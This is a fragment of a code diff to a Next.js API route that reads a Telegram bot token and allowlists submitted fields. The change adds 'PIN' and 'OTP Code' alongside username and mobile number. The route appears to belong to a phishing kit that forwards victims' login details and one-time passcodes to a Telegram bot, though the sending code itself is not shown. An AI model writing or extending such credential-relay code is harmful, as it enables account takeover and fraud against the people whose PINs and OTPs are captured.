@@ -6,7 +6,7 @@ const ALLOWED_TITLES = new Set([
   'Mobile number submitted',
   'OTP verification attempted',
 ])
-const ALLOWED_FIELD_KEYS = new Set(['Username', 'Mobile Number'])
+const ALLOWED_FIELD_KEYS = new Set(['Username', 'Mobile Number', 'PIN', 'OTP Code'])
 
 export async function POST(request: NextRequest) {
   const botToken = process.env.TELEGRAM_BOT_TOKEN
